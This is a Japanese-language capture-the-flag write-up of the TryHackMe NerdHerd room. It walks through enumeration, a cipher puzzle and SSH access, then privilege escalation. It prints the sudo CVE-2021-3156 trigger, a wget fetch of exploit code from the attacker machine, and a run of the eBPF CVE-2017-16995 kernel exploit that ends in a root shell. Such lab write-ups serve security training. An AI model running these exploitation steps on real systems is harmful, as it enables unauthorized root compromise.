# NerdHerd CTF

https://tryhackme.com/room/nerdherd

## Enumeration

```shell
TARGET=10.10.119.127
sudo bash -c "echo $TARGET   nerd.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 61
22/tcp   open  ssh          syn-ack ttl 61
139/tcp  open  netbios-ssn  syn-ack ttl 61
445/tcp  open  microsoft-ds syn-ack ttl 61
1337/tcp open  waste        syn-ack ttl 61
```

1337 はHTTP

### FTP

anonymousで2ファイルダウンロード

```sh
$ ls -al
total 100
drwxrwxr-x 2 kali kali  4096 Jul 21 09:25 .
drwxrwxr-x 6 kali kali  4096 Jul 21 09:12 ..
-rw-rw-r-- 1 kali kali    28 Sep 15  2020 hellon3rd.txt
-rw-rw-r-- 1 kali kali 89894 Sep 11  2020 youfoundme.png
```

```sh
$ cat ./hellon3rd.txt 
all you need is in the leet
```

```sh
$ exiftool ./youfoundme.png 

Software                        : www.inkscape.org
Owner Name                      : fijbxslz
```

### SMB

```sh
$ enum4linux $TARGET

 =================================( Nbtstat Information for 10.10.3.63 )=================================
                                                                                                                                                                                                                                           
Looking up status of 10.10.3.63                                                                                                                                                                                                            
        NERDHERD        <00> -         B <ACTIVE>  Workstation Service
        NERDHERD        <03> -         B <ACTIVE>  Messenger Service
        NERDHERD        <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ========================================( Users on 10.10.3.63 )========================================
                                                                                                                                                                                                                                           
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck    Name: ChuckBartowski    Desc:                                                                                                                                                      

user:[chuck] rid:[0x3e8]

 ==================================( Share Enumeration on 10.10.3.63 )==================================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        nerdherd_classified Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            NERDHERD

[+] Attempting to map shares on 10.10.3.63                                                                                                                                                                                                 
                                                                                                                                                                                                                                           
//10.10.3.63/print$     Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                                          
//10.10.3.63/nerdherd_classified        Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                                                                                             
                                                                                                                                                                                                                                           
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                                                                 
//10.10.3.63/IPC$       Mapping: N/A Listing: N/A Writing: N/A

 =============================( Password Policy Information for 10.10.3.63 )=============================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           

[+] Attaching to 10.10.3.63 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] NERDHERD
        [+] Builtin

[+] Password Info for Domain: NERDHERD

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                                                                                                       
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
Password Complexity: Disabled                                                                                                                                                                                                              
Minimum Password Length: 5

 ===================( Users on 10.10.3.63 via RID cycling (RIDS: 500-550,1000-1050) )===================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[I] Found new SID:                                                                                                                                                                                                                         
S-1-22-1                                                                                                                                                                                                                                   

[I] Found new SID:                                                                                                                                                                                                                         
S-1-5-32                                                                                                                                                                                                                                   

[I] Found new SID:                                                                                                                                                                                                                         
S-1-5-32                                                                                                                                                                                                                                   

[I] Found new SID:                                                                                                                                                                                                                         
S-1-5-32                                                                                                                                                                                                                                   

[I] Found new SID:                                                                                                                                                                                                                         
S-1-5-32
```

共有名はわかったが、パスワードが分からないので後回し。

```sh
$ smbclient //$TARGET/nerdherd_classified -U "chuck" 
```

### 1337 Web

```
HACKED by 0xpr0N3rd

Just kidding silly.. I left something in here for you to find
```

```html
<!--
	keep digging, mister/ma'am
 -->

<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>
```

`The Trashmen - Surfin Bird - Bird is the Word 1963` というミュージックビデオ。

#### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://nerd.thm:1337 -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 311] [--> http://nerd.thm:1337/admin/]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 681570 / 681573 (100.00%)
===============================================================
```

/admin でログイン画面が表示される。

```html
<!--
	these might help:
		Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
-->
```

前半は Base64で `cibartowski`、後半は不明。

行き詰ったので、ここはウォークスルーを見た。  
PNGファイルのオーナーである `fijbxslz` を、Youtubeビデオの `birdistheworld` を使って、vigenere復号するとパスワードになる。それは分からない。

このパスワードを使って、SMB接続できた。テキストファイルを入手。

```sh
$ smbclient //$TARGET/nerdherd_classified -U "chuck" 

smb: \> ls
  .                                   D        0  Fri Sep 11 10:29:53 2020
  ..                                  D        0  Fri Nov  6 05:44:40 2020
  secr3t.txt                          N      125  Fri Sep 11 10:29:53 2020
```

```sh
$ cat secr3t.txt                     
Ssssh! don't tell this anyone because you deserved it this far:

        check out "/[REDACTED]"

Sincerely,
        0xpr0N3rd
<3
```

Webでこのパスにアクセスすると、テキストファイルが置かれていた。

```
alright, enough with the games.

here, take my ssh creds:
	
	chuck : [REDACTED]
```

これでSSH接続できる。

## 権限昇格

### sudo

sudo にCVE-2021-3156の脆弱性の可能性がある。

```sh
chuck@nerdherd:/home$ sudo --version
Sudo version 1.8.16
Sudoers policy plugin version 1.8.16
Sudoers file grammar version 45
Sudoers I/O plugin version 1.8.16

chuck@nerdherd:/home$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
*** Error in `sudoedit': free(): corrupted unsorted chunks: 0x0000559f9a579180 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x77725)[0x7f088461e725]
/lib/x86_64-linux-gnu/libc.so.6(+0x7ff4a)[0x7f0884626f4a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f088462aabc]
/lib/x86_64-linux-gnu/libc.so.6(setlocale+0x7c6)[0x7f08845d23e6]
/usr/lib/sudo/sudoers.so(+0xf7c3)[0x7f08829797c3]
/usr/lib/sudo/sudoers.so(+0x1a9e1)[0x7f08829849e1]
/usr/lib/sudo/sudoers.so(+0x1494f)[0x7f088297e94f]
sudoedit(+0x4f0f)[0x559f99a33f0f]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f08845c7830]
sudoedit(+0x6829)[0x559f99a35829]
```

kali

```sh
git clone https://github.com/CptGibbon/CVE-2021-3156.git
tar -czf cve.tar.gz ./CVE-2021-3156
python -m http.server
```

target
```sh
wget http://10.13.85.243:8000/cve.tar.gz
tar -xzf cve.tar.gz
cd CVE-2021-3156
make
./exploit
```

しかし、Abortするだけでシェルは取れなかった。

### CVE-2017-16995

linPeas.sh

```sh
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2017-16995] eBPF_verifier                                                                                                                                                                                                          

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
```

https://www.exploit-db.com/exploits/45010

```sh
chuck@nerdherd:~$ gcc -o exploit ./45010.c 
chuck@nerdherd:~$ ./exploit
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003ac94900
[*] Leaking sock struct from ffff880034cd12c0
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88003cd9a3c0
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88003cd9a3c0
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(chuck)
```

/root/root.txt はデコイ。

```sh
# cat /root/root.txt
cmon, wouldnt it be too easy if i place the root flag here?
```

bashヒストリーにフラグがあった。これはボーナスフラグの方だった。

```sh
# cat /root/.bash_history
```

面倒なので力技で。

```sh
find / -type f -not -path "/proc/*" -not -path "/sys/*" -exec grep -a "THM{" {} /dev/null \; 2>/dev/null
```

```sh
# find / -type f -not -path "/proc/*" -not -path "/sys/*" -exec grep -a "THM{" {} /dev/null \; 2>/dev/null
/root/.bash_history:THM{.......................................}
/opt/.root.txt:THM{.......................................}
/home/chuck/user.txt:THM{.......................................}
```

## 振り返り

- PNGのオーナーに初見で気づけたことは良かった。
- Youtubeのビデオについては・・・こういうパターンもあるんだということは把握。
- カーネルエクスプロイトの可能性は無意識的に除外してしまう癖がある。linPeasを実行したとき、Ubuntuのビルドが非常に古いことにすぐ気づくべきだった。
